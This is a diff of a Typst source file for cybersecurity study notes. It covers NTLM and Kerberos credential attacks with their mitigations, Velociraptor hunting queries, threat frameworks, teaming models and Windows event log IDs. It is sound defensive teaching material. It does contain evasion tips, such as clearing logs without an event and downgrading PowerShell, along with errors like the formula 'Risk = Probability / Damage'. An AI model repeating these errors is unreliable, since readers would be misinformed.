+    _Key Point:_ There is no password or hash disclosure, only a live relay of the hand shake.\
     _Mitigations:_ Enforce SMB signing, disable NTLM where possible and prefer Kerberos.
   ],
   chronos.diagram({
@@ -2069,10 +2120,10 @@ movement_ within the network.
 #grid(
   columns: (1fr, auto),
   [
-    If an attacker obtains a user’s NTLM hash #hinweis[(e.g., from LSASS or a SAM backup)], they can authenticate to
-    services that accept NTLM by presenting that hash instead of the password. The hash functions as a secret.
+    If an attacker obtains a user's NTLM hash #hinweis[(e.g., from LSASS or a SAM backup)], they can authenticate to
+    services that accept NTLM by presenting this hash of the password. The hash functions as a secret.
 
-    _Key point_: No plaintext password needed; the hash is enough for NTLM auth.\
+    _Key Point_: No plaintext password needed, the hash is enough for NTLM auth.\
     _Mitigations_: Credential Guard, LSA protection, remove legacy SSPs, restrict/disable NTLM and enforce SMB signing
   ],
   chronos.diagram({
@@ -2095,9 +2146,12 @@ movement_ within the network.
 #grid(
   columns: (1fr, auto),
   [
-    Instead of using the NTLM hash directly as in Pass-the-Hash to authenticate to NTLM‑accepting services, the attacker
-    uses the NT hash to obtain Kerberos tickets #hinweis[(generating a Kerberos TGT/ST)] and then authenticates with
-    Kerberos.\
+    Pass-the-hash only works on NTLM-based services. For Kerberos, Over-pass-the-hash is needed.
+    Instead of using the NTLM hash directly to authenticate to NTLM-accepting services, the attacker
+    _uses the NT hash to obtain Kerberos tickets_ #hinweis[(generating a Kerberos TGT/ST)] and then authenticates with
+    Kerberos.
+
+
 
     _Key point_: Bridges NTLM $->$ Kerberos by leveraging the NT hash to create valid Kerberos tickets\
     _Mitigations_: AES-only Kerberos #hinweis[(enforce modern encryption)], protected users group, credential guard
@@ -2110,6 +2164,7 @@ movement_ within the network.
     _par("TGS", display-name: align(center)[TGS])
     _par("Server", display-name: align(center)[`foo.local`])
 
+    _seq("Attacker", "Attacker", comment: [Inject stolen hash into\ own security context])
     _seq("Attacker", "Auth", comment: [AS-REQ #hinweis[(derive key from users NTLM hash)]])
     _seq("Auth", "Attacker", comment: [AS-REP #hinweis[(Receive TGT)]])
     _seq("Attacker", "TGS", comment: [TGS-REQ #hinweis[(Request ST for SPN `cifs/foo.local`)]])
@@ -2122,7 +2177,8 @@ movement_ within the network.
 
 === Pass-the-ticket
 If an attacker obtains a valid Kerberos ticket #hinweis[(TGT or ST)] from a compromised host, they can inject/reuse that
-ticket on another machine to authenticate as that user, without needing the password or hash.
+ticket on another machine to authenticate as that user, without needing the password or hash. Often used together with
+Over-pass-the-hash attacks.
 
 _Key point:_ Tickets are bearer tokens; whoever holds a valid one can use it until it expires\
 _Mitigations:_ Credential Guard (reduce LSASS ticket exposure), shorter ticket lifetimes, AES-only, protected users
@@ -2145,22 +2201,12 @@ _Mitigations:_ Credential Guard (reduce LSASS ticket exposure), shorter ticket l
 
 === Kerberoasting
 Targets service accounts that use Kerberos SPNs. Any domain user can request a service ticket for an SPN. The ST is
-encrypted with the service account's key #hinweis[(its password‑derived key)]. Attackers collect these TGS blobs
+encrypted with the service account's key #hinweis[(its password-derived key)]. Attackers collect these TGS blobs
 #hinweis[(e.g. via MitM)] and attempt offline cracking to recover the service account password.
 
 _Key point:_ There's no interaction with the service beyond normal ticket requests; the cracking is offline, so account
 lockouts don't occur.\
 _Mitigations:_ AES-only, strong and modern encryption, prefer Group Managed Service Accounts (gMSA)
-
-
-
-
-
-
-
-
-
-
 
 // Include the PDF poster as image, text remains selectable in compiled PDF
 #for page in range(1, 3) {
@@ -2169,13 +2215,12 @@ _Mitigations:_ AES-only, strong and modern encryption, prefer Group Managed Serv
 
 
 = Hunting with Velociraptor
-_Threat Hunting_ is the practice of actively searching for threats on systems, compared to methods like firewalls,
+_Threat Hunting_ is the practice of _actively searching for threats_ on systems, compared to methods like firewalls,
 intrusion detection systems or sandboxes, which are typically only analyzed after a warning for potential threats has
 been issued.
 
-
 Velociraptor is an open source SIEM tool #hinweis[(see chapter @siem)]. It works by installing clients on all machines
-you'd like to monitor. They will then show up in the Velociraptor server. With the _Virtual File System _(VFS), you can
+you'd like to monitor. They will then show up in the Velociraptor server. With the _Virtual File System (VFS)_, you can
 access their file system. On Windows Clients, the VFS tree will look like this:
 - _File:_ File system based on OS FS API
 - _NTFS:_ Raw parsing of the NTFS data
@@ -2186,7 +2231,7 @@ access their file system. On Windows Clients, the VFS tree will look like this:
 
 Velociraptor has its own SQL-like language called Velociraptor Query Language (VQL). It _run SQL-like queries on
 clients_ that extract information from them. Every query returns a result set #hinweis[(comparable to a table)]. The
-functionality can be extended with plugins
+functionality can be extended with plugins.
 
 #table(
   columns: (auto, 1fr),
@@ -2214,7 +2259,7 @@ functionality can be extended with plugins
     ```
   ],
 
-  [Branches], [```sql SELECT * FROM if(condition=Exe =~ "chrome", then={ /* ... */}, else={ /*...*/ })```],
+  [Branches], [```sql SELECT * FROM if(condition=Exe =~ "chrome", then={ /*...*/ }, else={ /*...*/ })```],
   [Loops with\ Subqueries],
   [
     ```sql
@@ -2224,7 +2269,7 @@ functionality can be extended with plugins
   ],
 )
 
-*Example:* Query that lists loaded DLLs including compile time and signature
+*Example 1:* Query that lists loaded DLLs including compile time and signature
 ```sql
 LET pids = SELECT * FROM pslist() WHERE Exe =~ "veloci"
 SELECT * FROM foreach(
@@ -2236,6 +2281,7 @@ SELECT * FROM foreach(
     FROM modules(pid=Pid)
   })
 ```
+
 *Example 2:* Get and parse Windows Event Logs
 ```sql
 LET seclogs <= SELECT FullPath
@@ -2256,11 +2302,11 @@ used recursively in other artifacts.
     Artifacts can then be ran on individual clients. The results of that artifact will be displayed in a Velociraptor
     notebook.
 
-    The example query on the right gets information about the current host with #underline(link(
-      "https://docs.velociraptor.app/vql_reference/popular/info/",
-    )[`info()`]) on Windows, Linux and macOS machines.
+    The example query on the right gets information about the current host with
+    #underline(link("https://docs.velociraptor.app/vql_reference/popular/info/")[`info()`])
+    on Windows, Linux and macOS machines.
 
-    *Example Artifacts:* Check if anomalous file exists, check executed shell commands, extracting browser history,
+    *Example Artifacts:* Check if anomalous file exists, check executed shell commands, extract browser history,
     extract network traffic, recover deleted files, `KapeFiles` for quick triage
   ],
   [
@@ -2281,14 +2327,14 @@ used recursively in other artifacts.
   ],
 )
 
-Some artifacts allow you to use YARA. However, it is relatively expensive. Consider more targeted glob expressions and
-client-side throttling since usually YARA scanning is not time-critical.
+Some artifacts allow you to use YARA. However, it is relatively expensive. Consider using more targeted glob expressions
+and client-side throttling since YARA scanning is usually not time-critical.
 
 == Hunting
 A hunt runs the same artifacts on a entire fleet of machines. Hunts can be restricted by OS and labels on the clients.
 Once a hunt has been created, it needs to be manually started. Only systems currently online will participate in the
-hunt and deliver results. Systems currently offline will execute the artifacts when they come back online. The results
-of the hunts will be aggregated into a Velociraptor notebook.
+hunt and send results back to the Velociraptor server. Systems currently offline will execute the artifacts when they
+come back online. The results of the hunts will be aggregated into a Velociraptor notebook.
 
 _Notebooks_ in Velociraptor show results from artifacts and hunts. The data can also be modified and custom VQL queries
 can be added.
@@ -2296,24 +2342,21 @@ can be added.
 A system that has a suspected infection can be _contained_. This will cut any network traffic of the machine except to
 the Velociraptor server. It is also assigned the "Quarantined" label.
 
-
-
-
 = Cyber Frameworks
 #v(-0.75em)
 == Cyber Kill Chain
-The Cyber Kill Chain is the first big publicly used Cyber Security model, developed by Lockheed Martin and published
-in 2011. The original version was timeline-based, while the improved model is a circle. It is a series of eight phases
-an attacker performs that defenders can trace. Implement security controls at each phase, break the chain and stop the
-attack.
+The Cyber Kill Chain, developed by Lockheed Martin and published in 2011, was the first widely used cyber security model.
+While the original version was timeline-based, the improved model is circular. It is a series of eight phases that an
+attacker performs, which defenders can trace. By implementing security controls at each phase, the chain can be broken
+and the attack stopped.
 
 #grid(
-  columns: (1.3fr, 1fr),
+  columns: (1.4fr, 1fr),
   align: horizon,
   [
     - _Reconnaissance:_ Attackers typically assess the situation from the outside-in, to identify targets and tactics
       for the attack
-    - _Intrusion:_ Based on the reconnaissance, the attackers get into your systems. They often leveraging or security
+    - _Intrusion:_ Based on the reconnaissance, the attackers get into your systems; often leveraging malware or security
       vulnerabilities
     - _Exploitation:_ Exploiting vulnerabilities, delivering malicious code onto the system to get a better foothold
     - _Privilege Escalation:_ Usually higher privileges are required for sensitive data, persistence and lateral
@@ -2329,48 +2372,55 @@ attack.
 )
 
 *Criticisms of the Cyber Kill Chain*
-- Not every phase is performed inside a victim network, these actions are more difficult to detect
+- Not every phase is performed inside a victim network. These actions are more difficult to detect
 - Internal attackers are more difficult to detect
 - The chain represents a series, in reality attackers can do different orders or things in parallel
 - Lack of descriptions for detection rules, little community effort around it
 
 == Diamond Model
-
 #grid(
   [
-    Developed by the Center for Cyber Intelligence Analysis and Threat Research (CCIATR) in 2013. It consists of four
-    basic components:
+    Developed by the Center for Cyber Intelligence Analysis and Threat Research (CCIATR) in 2013.
+    It is designed to help with analyzing cyber intrusions and focuses more on the relationships between
+    different elements.
+
+    It consists of four basic components:
     - _Adversary:_ Name, origin, motivation, description
     - _Infrastructure:_ IP addresses, malware, email addresses
     - _Victim:_ Location, vertical, goal, person, organization
     - _Capability:_ Method, targets, operational manual, malware
 
-    An adversary deploys a capability over some infrastructure against a victim. These activities are called _events_.
-    Events are phase-ordered by adversary-victim pair into activity threads representing the flow an adversary's
-    operations.
+    Additionally, the diamond model focuses on the relationship between those components:
+
   ],
   image("img/diamond-model.png"),
 )
+#v(-0.5em)
+- _Adversary-Victim:_ Attacker's motivation and objectives to target this specific victim
+- _Adversary-Infrastructure:_ How the attacker establishes and maintains their operations
+- _Victim-Infrastructure:_ How the attacker uses the victim's infrastructure in the attack
+- _Victim-Capability:_ Tactics used against the victim
 
+An adversary deploys a capability over some infrastructure against a victim. These activities are called _events_.
+Events are phase-ordered by adversary-victim pair into activity threads representing the flow an adversary's
+operations.
 
-
-
-== STIX/TAXII
+== STIX & TAXII
 _Structured Threat Information Expression (STIX)_ and _Trusted Automated Exchange of Intelligence Information (TAXII)_
 are standards to improve the prevention and mitigation of cyber attacks. They were developed by MITRE, OASIS Cyber
 Threat Intelligence and the US Department of Homeland Security in 2017. _STIX describes the "what"_ of threat
 intelligence, while _TAXII defines "how"_ that information is relayed. Both standards have machine-readable output and
 can better share information between parties.
 
-STIX describes cyber threat information like Motivation, Abilities, Capabilities and Response in a JSON-based format. It
-is the notation used for MISP.
+STIX _describes cyber threat information_ like Motivation, Abilities, Capabilities and Response in a JSON-based format.
+It is the notation used for MISP.
 
-There are three types of objects representable by STIX:
-- _Indicator:_ Name, description and `url:value` pattern
+There are 18 types of objects representable by STIX. The most important ones are:
+- _Indicator:_ Name, description and a pattern to search for. Either a STIX or YARA pattern
 - _Malware:_ Name, description, type of malware, phases of kill chain used
 - _Relationship:_ Source #hinweis[(indicator)] and target #hinweis[(malware)]
 
-TAXII is used to exchange intelligence information with other parties.
+TAXII is used to _exchange intelligence information_ with other parties.
 
 Four different services are offered to the users:
 - _Discovery:_ A way to learn what services an entity supports and how to interact with them
@@ -2391,15 +2441,17 @@ understand an attack.
 Each TTP is grouped into a column that roughly matches with the steps of the Cyber Kill Chain.
 #v(-1em)
 #align(center, image("img/mitre-attack.png", width: 95%))
+#v(-0.5em)
 
 #table(
-  columns: (auto, 1fr, 0.6fr),
+  columns: (auto, 1fr, 0.5fr),
   table.header([Terminology], [Description], [Example]),
-  [*Matrices*], [Container Name for Tactics & Techniques], [Enterprise, Mobile, ICS],
+  [*Matrices*], [Scenarios of ATT&CK with different Tactics and Techniques], [Enterprise, Mobile, ICS],
+
   [*Tactics (TA)*],
   [
-    Tactics represent the "why" of an ATT&CK technique or sub-technique. It is the adversary's tactical goal: the reason
-    for performing an action. For example, an adversary needs valid credentials to login into the protected system.
+    Tactics represent the "why" an attacker is performing an action. For example, an adversary needs valid credentials
+    to login into the protected system.
   ],
   [
     - TA0001 Initial Access
@@ -2409,7 +2461,7 @@ Each TTP is grouped into a column that roughly matches with the steps of the Cyb
 
   [*Techniques (T)*],
   [
-    Techniques represent 'how' an adversary achieves a tactical goal by performing an action. For example, an adversary
+    Techniques represent "how" an adversary achieves a tactical goal by performing an action. For example, an adversary
     may dump credentials to achieve credential access.
   ],
   [
@@ -2424,13 +2476,13 @@ Each TTP is grouped into a column that roughly matches with the steps of the Cyb
 
   [*Groups (G)*],
   [Hacking groups that perform attacks. Additional info like place of origin and motivation if known],
-  [APT19, APT32, APT37, Bandook],
+  [APT19, APT32, APT37,\ Bandook],
 
   [*Mitigations (M)*],
   [Prevent a technique or sub-technique from being successfully executed],
   [Update Software, Password Policies, Data Backup],
 )
-#v(-0.5em)
+
 *Limitations*
 - _Not a checklist:_ do not use this as a simple "can we detect this", but understand the attack, translate it into your
   environment, compare to existing controls
@@ -2438,28 +2490,30 @@ Each TTP is grouped into a column that roughly matches with the steps of the Cyb
 - _Not a way of documenting every possible attack:_ ATT&CK documents the known TTPs: when you document your own
   attacks/campaigns, you realize that you have more information about an attacker than what ATT&CK currently publicly
   describes
-- _Static, final list:_ the ATT&CK matrixes are improved or modified regularly and now include PRE-ATT&CK (preparation
-  attackers perform) and Mobile
+- _Static, final list:_ The ATT&CK matrices are improved or modified regularly and now include PRE-ATT&CK (preparation
+  attackers perform), Mobile devices and industrial control systems (ICS)
 
 *Comparison ATT&CK vs. Cyber Kill Chain*\
 ATT&CK allows you to show the lifecycle/progress of an attack inside your enterprise. The kill chain is more linear,
-while ATT&CK is more graph-like; you can move left to right, but also up and down within the tactics.
+while ATT&CK is more graph-like: you can move left to right, but also up and down within the tactics.
 
 == Vectr
 Vectr is a tool for APT emulation, based on MITRE ATT&CK. It can be used by red teams to launch an attack similar to
 existing APTs. Select the TTP and generate attack paths. The results can be tracked and thus show the improvements of
 the blue team. It also provides test cases and detection rules.
 
-= Red & Blue Teaming
 
+= Red & Blue Teaming
 #image("img/defense-tactics.png")
+
 == Pentesting
 Pentesting involves testing the security of an IT infrastructure by attacking it. The customer needs to explicitly hire
-pentester and allow these attacks. They also specify the scope of the attacks #hinweis[(Web App, E-banking, Remote
+pentesters and allow these attacks. They also specify the scope of the attacks #hinweis[(Web App, E-banking, Remote
   Access, Kubernetes, AWS...)] through _threat modelling_.
 
 The Pentester is testing the systems without trying to hide their activities. They send emails announcing the start and
-stop of the pentest. After it is done, they write a report about their findings and present them to the customer.
+stop of the pentest, but these may only be sent to the CTO and not the security team. After the attack is done, the
+pentesters write a report about their findings and present them to the customer.
 
 There are two ways of pentesting:
 - _Whitebox:_ The pentester receives information from the company, like login credentials, source code etc.
@@ -2471,8 +2525,8 @@ the following formula:
 $ "Risk" = "Probability" / "Damage" $
 
 == Blue Team
-The blue team is the IT defense departement within a company, usually a Security Operations Center (SOC). They are
-responsible for smooth operations of the company, defending from attacks.
+The blue team is the IT defense department within a company, usually a Security Operations Center (SOC).
+They are responsible for smooth operations of the company, defending from attacks.
 
 == Red Team
 A deliberately set-up team by the company to attack their own infrastructure. The goal is to simulate an attack as
@@ -2502,26 +2556,25 @@ attack is done, possible weaknesses in the blue team can be found.
 #v(-0.5em)
 #grid(
   [
-    - Perform OSINT & _gain initial access_ to the company infrastructure #sym.arrow Identify entry points from an
-      outside attacker's perspective
-    - _Establish persistence_, perform information gathering & reconnaissance #sym.arrow Identify weaknesses in
-      endpoints & valuable information collections
-    - _Compromise crucial assets_ & complete goals #sym.arrow Identify issues in protection measures of critical assets
+    - Perform OSINT & _gain initial access_ to the company infrastructure
+      #sym.arrow Identify entry points from an outside attacker's perspective
+    - _Establish persistence_, perform information gathering and reconnaissance
+      #sym.arrow Identify weaknesses in endpoints and where valuable information can be collected
+    - _Compromise crucial assets_ ans complete goals
+      #sym.arrow Identify issues in protection measures of critical assets
   ],
   [
     - _Escalate privileges and move laterally_
       #sym.arrow Identify and exploit issues in privilege management and zoning/segregation measures
     - _Workshop with Blue Team_
       #sym.arrow Identify gaps, weak points, issues in detection & response capabilities and processes
-
   ],
 )
 
-
 == Purple Team
-Purple teaming is a co-operative testing methodology between red and blue teams. It consists of simulations of malicious
-attacks & activities and aims to identify misconfigurations and coverage gaps in existing security controls. Purple
-Teaming works in the continous cycle of _assessing defenses_, _measuring coverages_ and _tuning defenses_.
+Purple teaming is a co-operative testing methodology _between red and blue teams_. It consists of simulations of
+malicious attacks and activities and aims to identify misconfigurations and coverage gaps in existing security controls.
+Purple Teaming works in the continuous cycle of _assessing defenses_, _measuring coverages_ and _tuning defenses_.
 
 *Goals of Purple Teaming*
 - Verify functionality of implemented use cases and associated processes
@@ -2534,17 +2587,19 @@ Teaming works in the continous cycle of _assessing defenses_, _measuring coverag
 #v(-0.5em)
 #grid(
   [
-    - Review implemented concepts, processes and organization #sym.arrow Identify conceptual issues
-    - Perform specific attacks to test implemented use cases and processes #sym.arrow Verify if a given use case works
-      as intended
-    - Perform attack variations for implemented use cases #sym.arrow Verify if detection can easily be bypassed
+    - _Review implemented concepts_, processes and organization
+      #sym.arrow Identify conceptual issues
+    - _Perform specific attacks_ to test implemented use cases and processes
+      #sym.arrow Verify if a given use case works as intended
+    - _Perform attack variations_ for implemented use cases
+      #sym.arrow Verify if detection can easily be bypassed
 
   ],
   [
-    - Perform additional attacks to test coverage/gaps of use cases #sym.arrow Verify if crucial security controls are
-      missing
-    - Review provided logs/alerts/communication #sym.arrow Verify if the provided information is adequate for further
-      processing
+    - Perform additional attacks to _test coverage/gaps of use cases_
+      #sym.arrow Verify if crucial security controls are missing
+    - _Review provided logs/alerts/communication_
+      #sym.arrow Verify if the provided information is adequate for further processing
 
   ],
 )
@@ -2558,7 +2613,7 @@ Teaming works in the continous cycle of _assessing defenses_, _measuring coverag
     - Red vs. Blue (during the attack)
     - One-shot attack simulation (from A to Z)
     - Attack activities based on missions
-    - Focuses only on detection capabilities involved with mission
+    - Focuses only on detection capabilities involved with the assigned mission
   ],
   [
     - Red & Blue work together
@@ -2571,11 +2626,13 @@ Teaming works in the continous cycle of _assessing defenses_, _measuring coverag
 #pagebreak()
 
 = Windows Event Logs
-Windows stores its logs in the proprietary binary _EVTX format_ at `%WINDIR%\Systen32\winevt\Logs` #hinweis[(but can be
-  changed in the Registry: `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog`)]. The _logged
-events depend on the configuration_, usually done via Group Policies of Active Directory or MDM. Each log has a maximum
-file size #hinweis[(default 20MB)]. There are three options when the maximum size has been reached:
-- _Overwrite:_ Old events are overwritten, rotate the ones you want to keep out
+Windows stores its logs in the proprietary binary _EVTX format_ at `%WINDIR%\Systen32\winevt\Logs`
+#hinweis[(but the location can be changed in the Registry:
+  `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog`)].
+The _logged events depend on the configuration_, which is usually done via Group Policies of Active Directory or MDM.
+Each log has a maximum file size #hinweis[(default 20MB)].
+There are three options when the maximum size has been reached:
+- _Overwrite:_ Old events are overwritten. Manually rotate the ones you want to keep out
 - _Archive:_ Rename the logs to something else
 - _Do Nothing:_ Event logs remains full and no further events are logged
 
@@ -2583,8 +2640,10 @@ file size #hinweis[(default 20MB)]. There are three options when the maximum siz
   columns: (auto, 1fr),
   table.header([Log Name], [Description]),
   [*`Security.evtx`*],
-  [Access Control and security infomrmation. Only written to by `lsass.exe` and only readable by Admin. The most
-    important log for forensics],
+  [
+    Access Control and security information. Only written to by `lsass.exe` and only readable by Admin accounts.
+    The most important log for forensics
+  ],
 
   [*`System.evtx`*], [Windows system events #hinweis[(drivers, services, resources)]],
   [*`Application.evtx`*], [Non-system related software events],
@@ -2600,29 +2659,30 @@ _Hayabusa_ is a event log timeline generator that detects known bad behavior in 
 == LSASS <lsass>
 _Local Security Authority Subsystem Service (LSASS)_ is a process in Windows that is responsible for _enforcing the
 security policy_ on the system. It verifies users logging on to a Windows computer or server, handles password changes,
-and creates access tokens. `lsass.exe` is a Windows process that takes care of security policy for the OS. For example,
-when you logon to a Windows user account or server, `lsass.exe` verifies the logon name and password. If you terminate
-`lsass.exe` you will probably find yourself logged out of Windows.
+and creates access tokens. `lsass.exe` is a Windows process that takes care of security policy for the OS.
+For example, when you logon to a Windows user account or server, `lsass.exe` verifies the logon name and password.
+If you terminate `lsass.exe` you will probably find yourself logged out of Windows.
 
 `lsass.exe` also writes to the Windows Security Log so you can search there for failed authentication attempts along
-with other security policy issues. To secure LSASS, enable protections such as Credential Guard #hinweis[(see chapter
-  @credential-guard)], run LSASS as a Protected Process Light (PPL), restrict administrative access, and monitor for
-suspicious access or memory dumping attempts.
+with other security policy issues. To secure LSASS, enable protections such as Credential Guard
+#hinweis[(see chapter @credential-guard)], run LSASS as a Protected Process Light (PPL), restrict administrative access,
+and monitor for suspicious access or memory dumping attempts.
 
 == Security.evtx
+LSASS logs the following events to `Security.evtx`
+#v(-0.5em)
 #grid(
   [
     - System Events #hinweis[(System start, shutdown)]
     - Logon Events #hinweis[(User logging on or off (stored on authorized system))]
     - Account Logon #hinweis[(Recorded on the authorizing system (Domain Controller usually))]
     - Privilege Use #hinweis[(User Account exercising a privilege)]
-
   ],
   [
     - Account Management #hinweis[(Modifications of accounts)]
-    - Object Access #hinweis[(System Access Control List (SACL) based objects (files / folders / registry…))]
+    - Object Access #hinweis[(System Access Control List (SACL) based objects (files / folders / registry...))]
     - Directory Service #hinweis[(AD Object with SACL accessed)]
-    - Process Tracking #hinweis[(Process start, exit, …)]
+    - Process Tracking #hinweis[(Process start, exit, ...)]
   ],
 )
 
@@ -2632,7 +2692,7 @@ suspicious access or memory dumping attempts.
   columns: (auto, 1fr),
   table.header([Event ID], [Description]),
   [*1102*], [Event deleted from Event Log],
-  [*4624*], [Successful Logon],
+  [*4624*], [Successful Logon. Includes the logon type, see table below],
   [*4625*], [Failed Logon],
   [*4624 / 4647 / 4634*], [Successful Logoff],
   [*4648*],
@@ -2657,20 +2717,24 @@ suspicious access or memory dumping attempts.
   columns: (auto, auto, 1fr),
   table.header([Logon Type], [Name], [Description]),
   [*2*], [_Interactive_], [Logon with keyboard and screen of system],
-  [*3*], [_Network_], [connection to shared folder on this computer from elsewhere on network],
-  [*4*], [_Batch_], [Scheduled task],
-  [*5*], [_Service_], [Service startup],
+  [*3*], [_Network_], [Connection to shared folder on this computer from elsewhere on network],
+  [*4*], [_Batch_], [Scheduled task running as the specified user],
+  [*5*], [_Service_], [Service startup running as the specified user],
   [*7*], [_Unlock_], [Unattended workstation with password protected screen saver],
   [*8*],
   [_NetworkCleartext_],
-  [Logon with credentials sent in the clear text. Most often indicates a logon to IIS #hinweis[(Internet Information
-      Service, built-in web server)] with basic authentication.],
+  [
+    Logon with credentials sent in the clear text. Most often indicates a logon to IIS
+    #hinweis[(Internet Information Service, built-in web server)] with basic authentication.
+  ],
 
   [*9*],
   [_NewCredentials_],
-  [Logon with RunAs or mapping a network drive with alternate credentials. #hinweis[("A caller cloned its current token
-      and specified new credentials for outbound connections. The new logon session has the same local identity but uses
-      different credentials for other network connections.")]],
+  [
+    Logon with RunAs or mapping a network drive with alternate credentials.
+    #hinweis[("A caller cloned its current token and specified new credentials for outbound connections.
+      The new logon session has the same local identity but uses different credentials for other network connections.")]
+  ],
 
   [*10*], [_RemoteInteractive_], [Terminal Services, Remote Desktop or Remote Assistance],
   [*11*],
@@ -2699,21 +2763,21 @@ suspicious access or memory dumping attempts.
 #pagebreak()
 
 === PowerShell Logs
-PowerShell activity is logged in two different locations: _Windows PowerShell_ #hinweis[(`Windows PowerShell.evtx`)] and
+PowerShell activity is logged in two different locations in the Event Logs:
+_Windows PowerShell_ #hinweis[(`Windows PowerShell.evtx`)] and
 _Microsoft\\Windows\\PowerShell\\Operational_ #hinweis[(`Microsoft-Windows-PowerShell%4Operational.evtx`)]
 
 PowerShell 5 and later have automatic logging of suspicious scripts. It shows what has been executed, but malware is
-often obfuscated. The used version can be manually downgraded with `-Version 3.0`
+often obfuscated. The used version can be manually downgraded with `powershell -Version 3.0`
 
 PowerShell also logs outside of the event log: _PSReadline_ records the last 4096 commands into
-`%appdata%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. The transcript logs record all input and
-output into PowerShell. Needs to be enabled with GPO or `Start-Transcript`. Per default, it writes to
-`%userprofile%\Documents`.
-
+`%appdata%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. The _transcript logs_ record all input and
+output from PowerShell. Transcript logging is disabled by default and needs to be enabled with GPO or `Start-Transcript`.
+Per default, it writes to `%userprofile%\Documents`.
 
 == Active Directory Logging
-The Active Directory domain controller logs authentication attempts in their logs. See chapter @kerberos for details of
-Kerberos terminology.
+The _Active Directory domain controller_ logs all authentication attempts in the domain.
+See chapter @kerberos for details of Kerberos terminology.
 
 #table(
   columns: (auto, 1fr),
@@ -2724,7 +2788,7 @@ Kerberos terminology.
   [*4776*], [Account Authentication with NTLM (Success or Failure)],
 )
 
-The authenticating system als produces their own logs
+The _authenticating system_ als produces their own logs
 #table(
   columns: (auto, 1fr),
   table.header([Log ID], [Description]),
@@ -2732,39 +2796,41 @@ The authenticating system als produces their own logs
   [*4769*], [Kerberos ST requested (Success or Failure)],
   [*4771*], [Kerberos Pre-Authentication failed],
   [*4776*],
-  [NTLM: Domain Controller validated credentials (Success or Failure) #hinweis[(Suspicious, especially when observed on
-      a workstation)]],
+  [
+    NTLM: Domain Controller validated credentials (Success or Failure)
+    #hinweis[(Suspicious, especially when observed on a workstation)]
+  ],
 )
 
 == Auditing with logs
-Process creation is not logged by default, it must be enabled with a Group Policy #hinweis[(Computer
-  Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy\\Configuration\\System Audit
-  Policies\\Detailed Tracking)]. Every process will then create a _4688 A new process has been created_ log. It shows
-the executable run, the command line, the parent process and the user who ran it.
+Process creation is not logged by default, it must be enabled with a Group Policy
+#hinweis[(Computer Configuration\\Windows Settings\\Security Settings\\Advanced Audit Policy\\Configuration\\
+  System Audit Policies\\Detailed Tracking)]. Every process will then create a _4688 A new process has been created_ log.
+It shows the executable run, the command line, the parent process and the user who ran it.
 
 In the `Microsoft-Windows-NTFS%4Operational.evtx` log, the _event 142_ shows the free storage on the drives and the
-storage change since the last 142 log.
-
+storage change since the last time event 142 was logged.
 
 Deleting event logs results in a new event: _1102 The audit log was cleared_. But there are tools to allow clearing logs
 without triggering a 1102, like Mimikatz.
 
-A surge of _4625 Failed Login_ logs indicates a brute force attack on the machine.
+A surge of _4625 Failed Login_ events indicates a brute force attack on the machine.
 
 A good IoC is _4720 Account Creation_ when a malware creates a new user account for persistence. These events are
 relatively uncommon and thus easy to monitor for. Related events are _4728 / 4732 / 4756_ when a user gets added to a
 group.
 
-*Example for Lateral Movement:* 4624 / 4672 #hinweis[(Logon)] $->$ 5145 / 5140 #hinweis[(Access file share)] $->$ 4697 /
-7045 #hinweis[(Service Lookup & Creation)]. This happened due to an automatic attack via Metasploit.
+*Example for Lateral Movement:* 4624 / 4672 #hinweis[(Logon)] $->$ 5145 / 5140 #hinweis[(Access file share)] $->$
+4697 / 7045 #hinweis[(Service Lookup & Creation)]. This happened due to an automatic attack via Metasploit.
 
 #pagebreak()
 
 === User Rights Enumeration
-Which domain user has what permissions on what system? _SharpHound_ will try to enumerate local group membership on the
-target systems by querying the Windows SAM database remotely via _Security Account Manager (SAM)_ Remote Protocol
-#hinweis[(RPC over port 445)]. All authenticated users have access to SAM on Domain Controllers (DC) and Read-Only
-Domain Controllers (RODC). However, the local SAM database of a DC isn't normally used!
+Which domain user has what permissions on which system? _SharpHound_ will try to enumerate local group membership
+on the target systems by querying the _Windows Security Account Manager (SAM) database_ remotely via
+_SAM Remote Protocol_ #hinweis[(RPC over port 445)]. All authenticated users have access to SAM on
+Domain Controllers (DC) and Read-Only Domain Controllers (RODC). However, the local SAM database of
+the DC itself isn't normally used!
 
 #table(
   columns: (auto, 1fr),
@@ -2774,11 +2840,12 @@ Domain Controllers (RODC). However, the local SAM database of a DC isn't normall
   [*4799*], [A security-enabled local group membership was enumerated #hinweis[(List members of group)]],
 )
 
-== Sysmon
+== Sysmon <sysmon>
 #grid(
   [
-    Sysmon is a Windows system monitoring tool and part of the Sysinternals suite. It can provide additional Windows
-    Event logs about the happenings on the system. Sysmon installs a service to persist across reboots.
+    Sysmon is a Windows system monitoring tool and part of the Microsoft Sysinternals suite.
+    It can provide additional Windows Event logs about the happenings on the system.
+    Sysmon installs a service to persist across reboots.
 
     Sysmon has an extensive filtering system: white- or blacklist events, filter network ports, process names or driver
     signatures.
@@ -2790,7 +2857,7 @@ Domain Controllers (RODC). However, the local SAM database of a DC isn't normall
     table.header([ID], [Description]),
     [*1*], [Process creation],
     [*2*], [A process changed file creation time],
-    [*3*], [Network connection],
+    [*3*], [Network connection #hinweis[(All TCP/UDP connections)]],
     [*4*], [Sysmon service state changed #hinweis[(Service started/stopped)]],
     [*5*], [Process terminated],
     [*6*], [Driver loaded],
@@ -2801,17 +2868,17 @@ Domain Controllers (RODC). However, the local SAM database of a DC isn't normall
 )
 
 
-
 = MISP <misp>
-Threat intelligence sharing matters. Cyber Security is a team sport. Bad Guys share information, expertise and code. The
-good guys are left behind. Collaboration between individuals and organisations becomes increasingly important. Some
-platforms share their knowledge freely, so called _Open Source Intelligence (OSINT)_.
+Threat intelligence sharing matters. Cyber Security is a team sport. Bad Guys share information, expertise and code.
+The good guys are left behind. Collaboration between individuals and organizations becomes increasingly important.
+Some platforms share their knowledge freely, so called _Open Source Intelligence (OSINT)_.
 
 _Malware Information Sharing Platform (MISP)_ is a threat intelligence platform for gathering, sharing, storing and
-correlating Indicators of Compromise. Developed by the Computer Incident Response Center in Luxemburg. By _hosting your
-own MISP instances_ you can receive and share this information from/with 6000 organizations worldwide. It is the
